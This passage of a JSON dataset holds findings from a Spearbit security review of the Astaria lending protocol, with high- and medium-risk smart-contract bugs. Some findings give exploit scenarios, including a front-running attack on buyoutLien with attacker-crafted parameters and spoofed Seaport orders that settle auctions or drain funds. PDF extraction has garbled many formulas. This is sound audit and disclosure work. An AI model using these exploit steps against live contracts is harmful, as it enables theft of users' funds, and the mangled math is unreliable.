        "body": "When we commit to a new lien, the following gets checked to be true for all j 2 0, (cid:1) (cid:1) (cid:1) , n (cid:0) 1: onew + on(cid:0)1 + (cid:1) (cid:1) (cid:1) + oj (cid:20) Lj where: parameter description oi onew n Li L0 k k A0 k _getOwed(newStack[i], newStack[i].point.end) _getOwed(newSlot, newSlot.point.end) stack.length newStack[i].lien.details.liquidationInitialAsk params.encumber.lien.details.liquidationInitialAsk params.position params.encumber.amount 12 so in a stack in general we should have the: But when an old lien is replaced with a new one, we only perform the following checks for L0 k : (cid:1) (cid:1) (cid:1) + oj+1 + oj (cid:20) Lj 0 0 0 k ^ L k (cid:21) A L k > 0 And thus we can introduce:  L0  o0 k (cid:28) Lk or k (cid:29) ok (by pushing the lien duration) which would break the inequality regarding oi s and Li . If the inequality is broken, for example, if we buy out the first lien in the stack, then if the lien expires and goes into a Seaport auction the auction's starting price L0 would not be able to cover all the potential debts even at the beginning of the auction.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "VaultImplementation.buyoutLien can be DoSed by calls to LienToken.buyoutLien (cid:1) (cid:1) (cid:1) + oj+1 + oj (cid:20) Lj",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Anyone can call into LienToken.buyoutLien and provide params of the type LienActionBuyout: params.incoming is not used, so for example vault signatures or strategy validation is skipped. There are a few checks for params.encumber. Let's define the following variables: parameter value i kj tj ej e0 i lj l 0 i rj r 0 i c params.position params.encumber.stack[j].point.position params.encumber.stack[j].point.last params.encumber.stack[j].point.end tnow + D0 i params.encumber.stack[j].point.lienId i )) where h is the keccak256 of the encoding i , r 0 i , c0 i , S0 i , D0 i , V 0 i , (A0max h(N 0 i , P 0 i , L0 params.encumber.stack[j].lien.details.rate : old rate params.encumber.lien.details.rate : new rate params.encumber.collateralId 13 parameter value cj c0 i Aj A0 i Amax j A0max i R Nj N 0 i Vj V 0 i Sj S0 i Dj D0 i Pj P0 i Lj L0 i Imin Dmin tnow bi o oj n params.encumber.stack[j].lien.collateralId params.encumber.lien.collateralId params.encumber.stack[j].point.amount params.encumber.amount params.encumber.stack[j].lien.details.maxAmount params.encumber.lien.details.maxAmount params.encumber.receiver params.encumber.stack[j].lien.token params.encumber.lien.token params.encumber.stack[j].lien.vault params.encumber.lien.vault params.encumber.stack[j].lien.strategyRoot params.encumber.lien.strategyRoot params.encumber.stack[j].lien.details.duration params.encumber.lien.details.duration params.encumber.stack[j].lien.details.maxPotentialDebt params.encumber.lien.details.maxPotentialDebt params.encumber.stack[j].lien.details.liquidationInitialAsk params.encumber.lien.details.liquidationInitialAsk AstariaRouter.s.minInterestBPS AstariaRouter.s.minDurationIncrease block.timestamp buyout _getOwed(params.encumber.stack[params.position], block.timestamp) _getOwed(params.encumber.stack[j], params.encumber.stack[j].point.end) params.encumber.stack.length O = o0 + o1 + (cid:1) (cid:1) (cid:1) + on(cid:0)1 _getMaxPotentialDebtForCollateral(params.encumber.stack) sj s0 i params.encumber.stack[j] newStack Let's go over the checks and modifications that buyoutLien does: 1. validateStack is called to make sure that the hash of params.encumber.stack matches with s.collateralStateHash value of c. This is not important and can be bypassed by the exploit even after the fix for Issue 106. 2. _createLien is called next which does the following checks: 2.1. c is not up for auction. 2.2. We haven't reached max number of liens, currently set to 5. 2.3. L0 > 0 2.4. If params.encumber.stack is not empty then c0 i , (A0max i , L0 i )) where h is the hashing mechanism of encoding and then taking the keccak256. 2.6 The new stack slot and i = c0 2.5. We _mint a new lien for R with id equal to h(N 0 i and L0 i (cid:21) A0 i , V 0 i , D0 i , S0 i , P 0 i , c0 , r 0 i i 14 the new lien id is returned. 3. isValidRefinance is called which performs the following checks: 3.1. checks c0 i = c0 3.2. checks either or (r 0 i < ri (cid:0) Imin) ^ (e0 i (cid:21) ei ) i i (cid:20) ri ) ^ (e0 (r 0 is in auction by checking s.collateralStateHash's value. i (cid:21) ei + Dmin) 4. check where c0 i 5. check O (cid:20) P0 i . 6. check A0max (cid:21) o. 7. send wETH through TRANSFER_PROXY from msg.sender to payee of li with the amount of bi . 8. if payee of li is a public vault, do some book keeping by calling handleBuyoutLien. 9. call _replaceStackAtPositionWithNewLien to:  9.1. replace si with s0  9.2. _burn li .  9.3. delete s.lienMeta of li . i in params.encumber.stack. So in a nutshell the important checks are:  c, ci are not in auction (not important for the exploit)  c0 i = c0 i and L0  n is less than or equal to max number of allowed liens ( 5 currently) (not important for the exploit)  L0 i (cid:21) A0  O (cid:20) P0 i  A0max i > 0 (cid:21) o i or (r 0 i < ri (cid:0) Imin) ^ (e0 i (cid:21) ei ) i (cid:20) ri ) ^ (e0 (r 0 i (cid:21) ei + Dmin) Exploit An attacker can DoS the VaultImplementation.buyoutLien as follows: 1. A vault decides to buy out a collateral's lien to offer better terms and so signs a commitment and some- one on behalf of the vault calls VaultImplementation.buyoutLien which if executed would call LienTo- ken.buyoutLien with the following parameters: 15 LienActionBuyout({ incoming: incomingTerms, position: position, encumber: ILienToken.LienActionEncumber({ collateralId: collateralId, amount: incomingTerms.lienRequest.amount, receiver: recipient(), lien: ROUTER().validateCommitment({ commitment: incomingTerms, timeToSecondEpochEnd: _timeToSecondEndIfPublic() }), stack: stack }) }) 2. The attacker fronrun the call from step 1. and instead provide the following modified parameters to LienTo- ken.buyoutLien LienActionBuyout({ incoming: incomingTerms, // not important, since it is not used and can be zeroed-out to save tx gas position: position, encumber: ILienToken.LienActionEncumber({ collateralId: collateralId, amount: incomingTerms.lienRequest.amount, receiver: msg.sender, // address of the attacker lien: ILienToken.Lien({ // note that the lien here would have the same fields as the original message by the vault rep. ,! token: address(s.WETH), vault: incomingTerms.lienRequest.strategy.vault, // address of the vault offering a better term strategyRoot: incomingTerms.lienRequest.merkle.root, collateralId: collateralId, details: details // see below }), stack: stack }) }) Where details provided by the attacker can be calculated by using the below snippet: uint8 nlrType = uint8(_sliceUint(commitment.lienRequest.nlrDetails, 0)); (bytes32 leaf, ILienToken.Details memory details) = IStrategyValidator( s.strategyValidators[nlrType] ).validateAndParse( commitment.lienRequest, s.COLLATERAL_TOKEN.ownerOf( commitment.tokenContract.computeId(commitment.tokenId) ), commitment.tokenContract, commitment.tokenId ); The result is that:  The newLienId that was supposed to be _minted for the recipient() of the vault, gets minted for the at- tacker.  The call to VaultImplementation.buyoutLien would fail, since the newLienId is already minted, and so the vault would not be able to receives the interests it had anticipated.  When there is a payment or Seaport auction settlement, the attacker would receive the funds instead. 16  The attacker can intorduces a malicous contract into the protocol ken.ownerOf(newLienId) without needing to register for a vault. that would be LienTo- To execute this attack, the attacker would need to spend the buyout amount of assets. Also the attacker does not necessarily need to front run a transaction to buyout a lien. They can pick their own hand-crafted parameters that would satisfy the conditions in the analysis above to introduce themselves in the protocol.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "VaultImplementation.buyoutLien does not update the new public vault's parameters and does not transfer assets between the vault and the borrower",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "VaultImplementation.buyoutLien does not update the accounting for the vault (if it's public). The slope, yIntercept, and s.epochData[...].liensOpenForEpoch (for the new lien's end epoch) are not updated. They are updated for the payee of the swapped-out lien if the payee is a public vault by calling handleBuyoutLien. Also, the buyout amount is paid out by the vault itself. The difference between the new lien amount and the buyout amount is not worked out between the msg.sender and the new vault.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "setPayee doesn't update y intercept or slope, allowing vault owner to steal all funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When setPayee() is called, the payment for the lien is no longer expected to go to the vault. How- ever, this change doesn't impact the vault's y-intercept or slope, which are used to calculate the vault's totalAs- sets(). This can be used maliciously by a vault owner to artificially increase their totalAssets() to any arbitrary amount:  Create a lien from the vault.  SetPayee to a non-vault address.  Buyout the lien from another vault (this will cause the other vault's y-int and slope to increase, but will not impact the y-int and slope of the original vault because it'll fail the check on L165 that payee is a public vault.  Repeat the process again going the other way, and repeat the full cycle until both vault's have desired totalAssets(). For an existing vault, a vault owner can withdraw a small amount of assets each epoch. If, in any epoch, they are one of the only users withdrawing funds, they can perform this attack immediately before the epoch is pro- cessed. The result is that the withdrawal shares will by multiplied by totalAssets() / totalShares() to get the withdrawal rate, which can be made artificially high enough to wipe out the entire vault.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "settleAuction() doesn't check if the auction was successful",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "settleAuction() is a privileged functionality called by LienToken.payDebtViaClearingHouse(). settleAuction() is intended to be called on a successful auction, but it doesn't verify that that's indeed the case. Anyone can create a fake Seaport order with one of its considerations set as the CollateralToken as described in Issue 93. Another potential issue is if the Seaport orders can be \"Restricted\" in future, then there is a possibility for an authorized entity to force settleAuction on CollateralToken, and when SeaPort tries to call back on the zone to validate it would fail.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Incorrect auction end validation in liquidatorNFTClaim()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "liquidatorNFTClaim() does the following check to recognize that Seaport auction has ended: if (block.timestamp < params.endTime) { //auction hasn't ended yet revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE); } Here, params is completely controlled by users and hence to bypass this check, the caller can set params.endTime to be less than block.timestamp. Thus, a possible exploit scenario occurs when AstariaRouter.liquidate() is called to list the underlying asset on Seaport which also sets liquidator address. Then, anyone can call liquidatorNFTClaim() to transfer the underlying asset to liquidator by setting params.endTime < block.timestamp.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Typed structured data hash used for signing commitments is calculated incorrectly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Since STRATEGY_TYPEHASH == keccak256(\"StrategyDetails(uint256 nonce,uint256 deadline,bytes32 root)\") The hash calculated in _encodeStrategyData is incorrect according to EIP-712. s.strategistNonce is of type uint32 and the nonce type used in the type hash is uint256. Also the struct name used in the typehash collides with StrategyDetails struct name defined as: 19 struct StrategyDetails { uint8 version; uint256 deadline; address vault; }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "makePayment doesn't properly update stack, so most payments don't pay off debt",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "As we loop through individual payment in _makePayment, each is called with: (newStack, spent) = _payment( s, stack, uint8(i), totalCapitalAvailable, address(msg.sender) ); This call returns the updated stack as newStack but then uses the function argument stack again in the next iteration of the loop. The newStack value is unused until the final iterate, when it is passed along to _updateCollateralStateHash(). This means that the new state hash will be the original state with only the final loan repaid, even though all other loans have actually had payments made against them.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "_removeStackPosition() always reverts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "removeStackPosition() always reverts since it calls stack array for an index beyond its length: for (i; i < length; ) { unchecked { newStack[i] = stack[i + 1]; ++i; } } Notice that for i==length-1, stack[length] is called. This reverts since length is the length of stack array. Additionally, the intention is to delete the element from stack at index position and shift left the elements ap- pearing after this index. However, an addition increment to the loop index i results in newStack[position] being empty, and the shift of other elements doesn't happen.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Refactor _paymentAH()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "_paymentAH() has several vulnerabilities:  stack is a memory parameter. So all the updates made to stack are not applied back to the corresponding storage variable.  No need to update stack[position] as it's deleted later.  decreaseEpochLienCount() is always passed 0, as stack[position] is already deleted. Also decreaseEp- ochLienCount() expects epoch, but end is passed instead.  This if/else block can be merged. updateAfterLiquidationPayment() expects msg.sender to be LIEN_- TOKEN, so this should work.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "processEpoch() needs to be called regularly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "If the processEpoch() endpoint does not get called regularly (especially close to the epoch bound- aries), the updated currentEpoch would lag behind the actual expected value and this will introduce arithmetic errors in formulas regarding epochs and timestamps.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Can create lien for collateral while at auction by passing spoofed data",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In the createLien function, we check that the collateral isn't currently at auction before giving a lien with the following check: if ( s.collateralStateHash[params.collateralId] == bytes32(\"ACTIVE_AUCTION\") ) { revert InvalidState(InvalidStates.COLLATERAL_AUCTION); } However, collateralId is passed in multiple places in the params: params.encumber.lien. both in params directly and in 23 The params.encumber.lien.collateralId is used everywhere else, and is the final value that is used. But the check is performed on params.collateralId. As a result, we can set the following:  params.encumber.lien.collateralId: collateral that is at auction.  params.collateralId: collateral not at auction. This will allow us to pass this validation while using the collateral at auction for the lien.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "stateHash isn't updated by buyoutLien function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "We never update the collateral state hash anywhere in the buyoutLien function. As a result, once all checks are passed, payment will be transferred from the buyer to the seller, but the seller will retain ownership of the lien in the system's state.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "If a collateral's liquidation auction on Seaport ends without a winning bid, the call to liquidatorN- FTClaim does not clear the related data on LienToken's side and also for payees that are public vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "If/when a liquidation auction ends without being fulfilled/matched on Seaport and afterward when the current liquidator calls into liquidatorNFTClaim, the storage data (s.collateralStateHash, s.auctionData, s.lienMeta) on the LienToken side don't get reset/cleared and also the lien token does not get burnt. That means:  s.collateralStateHash[collateralId] stays equal to bytes32(\"ACTIVE_AUCTION\").  s.auctionData[collateralId] will have the past auction data.  s.lienMeta[collateralId].atLiquidation will be true. That means future calls to commitToLiens by holders of the same collateral will revert.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "ClearingHouse cannot detect if a call from Seaport comes from a genuine listing or auction",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Anyone can create a SeaPort order with one of the considerations' recipients set to a ClearingHouse with a collateralId that is genuinely already set for auction. Once the spoofed order settles, SeaPort calls into this fallback function and causes the genuine Astaria auction to settle. This allows an attacker to set random items on sale on SeaPort with funds directed here (small buying prices) to settle genuine Astaria auctions on the protocol. This causes:  The Astaria auction payees and the liquidator would not receive what they would expect that should come from the auction. And if payee is a public vault it would introduce incorrect parameters into its system.  Lien data (s.lienMeta[lid]) and the lien token get deleted/burnt.  Collateral token and data get burnt/deleted.  When the actual genuine auction settles and calls back s.collateralIdToAuction[collateralId] check. to here, it will revert due to",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "c.lienRequest.strategy.vault is not checked to be a registered vault when commitToLiens is called",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "mentation(c.lienRequest.strategy.vault).commitToLien( ... ) of c.lienRequest.strategy.vault is not checked whether it is a registered vault within the system (by checking s.vaults). The caller can set this value to any address they would desire and potentially perform some unwanted actions. For example, the user could spoof all the values in commitments so that the later dependant contracts' checks are skipped and lastly we end up transferring funds: value after and the s.TRANSFER_PROXY.tokenTransferFrom( address(s.WETH), address(this), // <--- AstariaRouter address(msg.sender), totalBorrowed ); Not that since all checks are skipped, the caller can also indirectly set totalBorrowed to any value they would desire. And so, if AstariaRouter would hold any wETH at any point in time. Anyone can craft a payload to commitToLiens to drain its wETH balance.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Anyone can take a loan out on behalf of any collateral holder at any terms",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In the _validateCommitment() function, the initial checks are intended to ensure that the caller who is requesting the lien is someone who should have access to the collateral that it's being taken out against. The caller also inputs a receiver, who will be receiving the lien. In this validation, this receiver is checked against the collateral holder, and the validation is approved in the case that receiver == holder. However, this does not imply that the collateral holder wants to take this loan. This opens the door to a malicious lender pushing unwanted loans on holders of collateral by calling commitToLien with their collateralId, as well as their address set to the receiver. This will pass the receiver == holder check and execute the loan. In the best case, the borrower discovers this and quickly repays the loan, incurring a fee and small amount of interest. In the worst case, the borrower doesn't know this happens, and their collateral is liquidated.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Strategist Interest Rewards will be 10x higher than expected due to incorrect divisor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "VAULT_FEE is set as an immutable argument in the construction of new vaults, and is intended to be set in basis points. However, when the strategist interest rewards are calculated in _handleStrategistIntere- stReward(), the VAULT_FEE is only divided by 1000. The result is that the fee calculated by the function will be 10x higher than expected, and the strategist will be dramatically overpaid.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "The lower bound for liquidationInitialAsk for new lines needs to be stricter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "params.lien.details.liquidationInitialAsk ( Lnew ) is only compared to params.amount ( Anew ) whereas in _appendStack newStack[j].lien.details.liquidationInitialAsk ( Lj ) is compared to poten- tialDebt. potentialDebt is the aggregated sum of all potential owed amount at the end of each position/lien. So in _appendStack we have: onew + on + (cid:1) (cid:1) (cid:1) + oj (cid:20) Lj Where oj potential interest at the end of its term. is _getOwed(newStack[j], newStack[j].point.end) which is the amount for the stack slot plus the So it would make sense to enforce a stricter inequality for Lnew : (1 + r (tend (cid:0) tnow ) 1018 )Anew = onew (cid:20) Lnew The big issue regarding the current lower bound is when the borrower only takes one lien and for this lien liqui- dationInitialAsk == amount (or they are close). Then at any point during the lien term (maybe very close to the end), the borrower can atomically self liquidate and settle the Seaport auction in one transaction. This way the borrower can skip paying any interest (they would need to pay OpenSea fees and potentially royalty fees) and plus they would receive liquidation fees.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "commitToLiens transfers extra assets to the borrower when protocol fee is present",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "totalBorrowed is the sum of all commitments[i].lienRequest.amount But if s.feeTo is set, some of funds/assets from the vaults get transefered to s.feeTo when _handleProtocolFee is called and only the remaining is sent to the ROUTER(). So in this scenario, the total amount of assets sent to ROUTER() (so that it can be transferred to msg.sender) is up to rounding errors: (1 (cid:0) np dp )T Where:  T is the totalBorrowed  np is s.protocolFeeNumerator  dp is s.protocolFeeDenominator But we are transferring T to msg.sender which is more than we are supposed to send,",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Withdraw proxy's claim() endpoint updates public vault's yIntercept incorrectly.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Let parameter description y0 n En(cid:0)1 Bn(cid:0)1 Wn(cid:0)1 Sn(cid:0)1 Sv Bv V the yIntercept of our public vault in the question. the current epoch for the public vault. the expected storage parameter of the previous withdraw proxy. the asset balance of the previous withdraw proxy. the withdrawReserveReceived of the previous withdraw proxy. the total supply of the previous withdraw proxy. the total supply of the public vault when processEpoch() was last called on the public vault. the total balance of the public vault when processEpoch() was last called on the public vault. the public vault. 28 parameter description Pn(cid:0)1 the previous withdraw proxy. Then y0 is updated/decremented according to the formula (up to rounding errors due to division): y0 = y0 (cid:0) max(0, En(cid:0)1 (cid:0) (Bn(cid:0)1 (cid:0) Wn(cid:0)1))(1 (cid:0) Sn(cid:0)1 Sv ) Whereas the amount ( A ) of assets transfered from Pn(cid:0)1 to V is And the amount ( B ) of asset left in Pn(cid:0)1 after this transfer would be: A = (Bn(cid:0)1 (cid:0) Wn(cid:0)1)(1 (cid:0) Sn(cid:0)1 Sv ) B = Wn(cid:0)1 + (Bn(cid:0)1 (cid:0) Wn(cid:0)1) Sn(cid:0)1 Sv (cid:1) (Bn(cid:0)1 (cid:0) Wn(cid:0)1) is supposed to represent the payment withdrawal proxy receives from Seaport auctions plus the amount of assets transferred to it by external actors. So A represents the portion of this amount for users who have not withdrawn from the public vault on the previous epoch and it is transferred to V and so y0 should be compensated positively. Also note that this amount might be bigger than En(cid:0)1 if a lien has a really high liquida- tionInitialAsk and its auction fulfills/matches near that price on Seaport. So it is possible that En(cid:0)1 < A. The current update formula for updating the y0 has the following flaws:  It only considers updating y0 when En(cid:0)1 (cid:0) (Bn(cid:0)1 (cid:0) Wn(cid:0)1) > 0 which is not always the case.  Decrements y0 by a portion of En(cid:0)1. The correct updating formula for y0 should be: y0 = y0 (cid:0) En(cid:0)1 + (Bn(cid:0)1 (cid:0) Wn(cid:0)1)(1 (cid:0) Sn(cid:0)1 Sv ) Also note, if we let Bn(cid:0)1 (cid:0) Wn(cid:0)1 = Xn(cid:0)1 + (cid:15), where Xn(cid:0)1 is the payment received by the withdraw proxy from Seaport auction payments and (cid:15) (if Wn(cid:0)1 updated correctly) be assets received from external actors by the previous withdraw proxy. Then: B = Wn(cid:0)1 + (Xn(cid:0)1 + (cid:15)) Sn(cid:0)1 Sv (cid:1) = h max(0, Bv (cid:0) En(cid:0)1) + Xn(cid:0)1 + (cid:15) i Sn(cid:0)1 Sv (cid:1) The last equality comes from the fact that when the withdraw reserves is fully transferred from the public vault and the current withdraw proxy (if necessary) to the previous withdraw proxy the amount Wn(cid:0)1 would hold should be max(0, Bv (cid:0) En(cid:0)1) Sn(cid:0)1 . Sv (cid:1) Related Issue.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Public vault's yIntercept is not updated when the full amount owed is not paid out by a Seaport auction.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When the full amountOwed for a lien is not paid out during the callback from Seaport to a collateral's ClearingHouse and if the payee is a public vault, we would need to decrement the yIntercept, otherwise the payee.totalAssets() would reflect a wrong value.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "LienToken payee not reset on transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "payee and ownerOf are detached in that owners may set payee and owner may transfer the LienTo- ken to a new owner. payee does not reset on transfer. Exploit scenario:  Owner of a LienToken sets themselves as payee  Owner of LienToken sells the lien to a new owner  New owner does not update payee  Payments go to address set by old owner",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "WithdrawProxy allows redemptions before PublicVault calls transferWithdrawReserve",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Anytime there is a withdraw pending (i.e. someone holds WithdrawProxy shares), shares may be redeemed so long as totalAssets() > 0 and s.finalAuctionEnd == 0. Under normal operating conditions totalAssets() becomes greater than 0 when then PublicVault calls trans- ferWithdrawReserve. totalAssets() can also be increased to a non zero value by anyone transferring WETH to the contract. If this occurs and a user attempts to redeem, they will receive a smaller share than they are owed. Exploit scenario:  Depositor redeems from PublicVault and receives WithdrawProxy shares.  Malicious actor deposits a small amount of WETH into the WithdrawProxy.  Depositor accidentally redeems, or is tricked into redeeming, from the WithdrawProxy while totalAssets() is smaller than it should be.  PublicVault properly processes epoch and full withdrawReserve is sent to WithdrawProxy.  All remaining holders of WithdrawProxy shares receive an outsized share as the previous shares we re- deemed for the incorrect value.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Point.position is not updated for stack slots in _removeStackPosition",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "uint8(params.stack.length) which would be its index in the stack. When _removeStackPosition is called to remove a slot newStack[i].point.position is not updated for indexes that are greater than position in the original stack. Also slot.point.position is only used when we emit AddLien and LienStackUpdated events. In both of those cases, we could have used params.stack.length",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "unchecked may cause under/overflows",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "unchecked should only be used when there is a guarantee of no underflows or overflows, or when they are taken into account. In absence of certainty, it's better to avoid unchecked to favor correctness over gas efficiency. For instance, if by error, protocolFeeNumerator is set to be greater than protocolFeeDenominator, this block in _handleProtocolFee() will underflow: PublicVault.sol#L640, unchecked { amount -= fee; } However, later this reverts due to the ERC20 transfer of an unusually high amount. This is just to demonstrate that unknown bugs can lead to under/overflows.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk PublicVault.sol#L563, LienToken.sol#L424, LienToken.sol#L482, PublicVault.sol#L376, PublicVault.sol#L422, Public-"
        ]
    },
    {
        "title": "Multiple ERC4626Router and ERC4626RouterBase functions will always revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The intention of the ERC4626Router.sol functions is that they are approval-less ways to deposit and redeem: // For the below, no approval needed, assumes vault is already max approved As long as the user has approved the TRANSFER_PROXY for WETH, this works for the depositToVault function:  WETH is transferred from user to the router with pullTokens.  The router approves the vault for the correct amount of WETH.  vault.deposit() is called, which uses safeTransferFrom to transfer WETH from router into vault. However, for the redeemMax function, it doesn't work:  Approves the vault to spend the router's WETH.  vault.redeem() is called, which tries to transfer vault tokens from the router to the vault, and then mints withdraw proxy tokens to the receiver. This error happens assuming that the vault tokens would be burned, in which case the logic would work. But since they are transferred into the vault until the end of the epoch, we require approvals. The same issue also exists in these two functions in ERC4626RouterBase.sol:  redeem(): this is where the incorrect approval lives, so the same issue occurs when it is called directly.  withdraw(): the same faulty approval exists in this function.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "UniV3 tokens with fees can bypass strategist checks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Each UniV3 strategy includes a value for fee in nlrDetails that is used to constrain their strategy to UniV3 pools with matching fees. This is enforced with the following check (where details.fee is the strategist's set fee, and fee is the fee returned from Uniswap): if (details.fee != uint24(0) && fee != details.fee) { revert InvalidFee(); } 33 This means that if you set details.fee to 0, this check will pass, even if the real fee is greater than zero.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "If auction time is reduced, withdrawProxy can lock funds from final auctions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When a new liquidation happens, the withdrawProxy sets s.finalAuctionEnd to be equal to the new incoming auction end. This will usually be fine, because new auctions start later than old auctions, and they all have the same length. However, if the auction time is reduced on the Router, it is possible for a new auction to have an end time that is sooner than an old auction. The result will be that the WithdrawProxy is claimable before it should be, and then will lock and not allow anyone to claim the funds from the final auction.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "claim() will underflow and revert for all tokens without 18 decimals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In the claim() function, the amount to decrease the Y intercept of the vault is calculated as: (s.expected - balance).mulWadDown(10**ERC20(asset()).decimals() - s.withdrawRatio) s.withdrawRatio is represented as a WAD (18 decimals). As a result, using any token with a number of decimals under 17 (assuming the withdraw ratio is greater than 10%) will lead to an underflow and cause the function to revert. In this situation, the token's decimals don't matter. They are captured in the s.expected and balance, and are also the scale at which the vault's y-intercept is measured, so there's no need to adjust for them. Note: I know this isn't a risk in the current implementation, since it's WETH only, but since you are planning to generalize to accept all ERC20s, this is important.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Call to Royalty Engine can block NFT auction",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "_generateValidOrderParameters() calls ROYALTY_ENGINE.getRoyaltyView() twice. The first call is wrapped in a try/catch. This lets Astaria to continue even if the getRoyaltyView() reverts. However, the second call is not safe from this. Both these calls have the same parameters passed to it except the price (startingPrice vs endingPrice). case they are different, there exists a possibility that the second call can revert. In",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
